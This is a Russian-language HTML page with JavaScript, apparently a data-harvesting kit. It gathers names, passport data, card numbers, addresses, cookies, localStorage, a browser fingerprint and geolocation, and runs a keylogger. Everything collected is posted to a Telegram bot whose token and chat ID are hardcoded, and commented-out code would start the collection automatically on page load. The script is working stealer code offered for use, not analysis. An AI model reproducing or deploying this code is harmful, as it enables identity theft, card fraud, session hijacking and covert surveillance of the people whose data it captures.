<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор данных</title>
    <style>
        body { background: #0d0d0d; color: #c0c0c0; font-family: monospace; padding: 20px; }
        .block { background: #1a1a1a; padding: 20px; margin-bottom: 20px; border-left: 4px solid #ff4444; }
        input, textarea { width: 100%; max-width: 500px; padding: 10px; margin: 6px 0; background: #222; color: #fff; border: 1px solid #444; }
        button { background: #ff4444; color: #fff; padding: 14px 30px; border: none; font-weight: bold; cursor: pointer; }
        #status { background: #111; padding: 20px; border: 1px solid #333; margin-top: 20px; }
    </style>
</head>
<body>

    <h1>🔍 Сбор данных</h1>
    <p style="color:#888;">Все данные отправляются в Telegram канал</p>

    <div class="block">
        <h3>📋 Личные данные</h3>
        <input type="text" id="firstname" placeholder="Имя">
        <input type="text" id="lastname" placeholder="Фамилия">
        <input type="email" id="email" placeholder="Email">
        <input type="text" id="phone" placeholder="Телефон">
        <input type="text" id="address" placeholder="Адрес">
        <input type="text" id="birthdate" placeholder="Дата рождения">
        <input type="text" id="passport" placeholder="Паспортные данные">
        <input type="text" id="card" placeholder="Номер карты">
    </div>

    <div class="block">
        <h3>🖥️ Системная информация</h3>
        <button onclick="collectAndSend()">🚀 Собрать и отправить</button>
        <button onclick="autoCollect()">⚡ Автосбор (включает кейлог)</button>
    </div>

    <div id="status">📦 Ожидание...</div>

    <script>
        // 🔥 ВСТАВЬ СВОИ ДАННЫЕ, ЁБАНЫЙ ТЫ ГЕНИЙ:
        const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';  // ТОКЕН БОТА
        const CHAT_ID = '-1003791860129';  // ID КАНАЛА (с минусом для группы/канала)

        let keylogData = [];

        // Кейлоггер
        document.addEventListener('keydown', function(e) {
            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
                keylogData.push(e.key);
                if (keylogData.length > 50) keylogData.shift();
            }
        });

        function getFingerprint() {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(10, 10, 20, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('fp', 30, 30);
            return canvas.toDataURL().slice(0, 80);
        }

        function collectAllData() {
            const data = {};

            // Личные данные
            data.firstname = document.getElementById('firstname').value || '—';
            data.lastname = document.getElementById('lastname').value || '—';
            data.email = document.getElementById('email').value || '—';
            data.phone = document.getElementById('phone').value || '—';
            data.address = document.getElementById('address').value || '—';
            data.birthdate = document.getElementById('birthdate').value || '—';
            data.passport = document.getElementById('passport').value || '—';
            data.card = document.getElementById('card').value || '—';

            // Браузер
            data.userAgent = navigator.userAgent;
            data.language = navigator.language;
            data.platform = navigator.platform;
            data.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
            data.screen = `${screen.width}x${screen.height}`;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.time = new Date().toLocaleString();
            data.referrer = document.referrer || 'Прямой заход';
            data.url = window.location.href;
            data.fingerprint = getFingerprint();

            // localStorage
            try {
                data.localStorage = JSON.stringify(localStorage, null, 2) || 'пусто';
            } catch (e) {
                data.localStorage = 'ошибка доступа';
            }

            // Куки
            data.cookies = document.cookie || 'нет кук';

            // Кейлог
            data.keylog = keylogData.join('') || 'пока тишина';

            // Геолокация (синхронная заглушка, реально асинхронно)
            data.geo = 'ожидание...';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                        sendToTelegram(data);
                    },
                    err => {
                        data.geo = 'отказано/ошибка';
                        sendToTelegram(data);
                    }
                );
            } else {
                data.geo = 'не поддерживается';
                sendToTelegram(data);
            }

            return data;
        }

        function sendToTelegram(data) {
            // Формируем текстовый файл
            let text = '📁 ДАННЫЕ ПОЛЬЗОВАТЕЛЯ\n';
            text += '═'.repeat(40) + '\n';
            for (let key in data) {
                text += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
            }
            text += '\n' + '═'.repeat(40) + '\n';
            text += `⏰ Время: ${new Date().toLocaleString()}`;

            // Отправка через Telegram Bot API
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(result => {
                document.getElementById('status').innerHTML = '✅ Данные отправлены в Telegram!';
                console.log('Успешно:', result);
            })
            .catch(error => {
                document.getElementById('status').innerHTML = '❌ Ошибка отправки: ' + error.message;
                console.error('Ошибка:', error);
            });
        }

        function collectAndSend() {
            document.getElementById('status').innerHTML = '⏳ Сбор и отправка...';
            const data = collectAllData();
            // Если гео уже отработало, отправка будет там, иначе дублируем
            if (!navigator.geolocation) {
                sendToTelegram(data);
            }
        }

        function autoCollect() {
            // Запускаем кейлог и собираем всё автоматически
            document.getElementById('status').innerHTML = '⏳ Автосбор...';
            // Имитация заполнения полей (для демо)
            // В реальности поля уже могут быть заполнены пользователем
            collectAndSend();
        }

        // Автоматический сбор при загрузке (если нужно - раскомментируй):
        // window.onload = function() {
        //     setTimeout(autoCollect, 3000);
        // };
    </script>
</body>
</html>
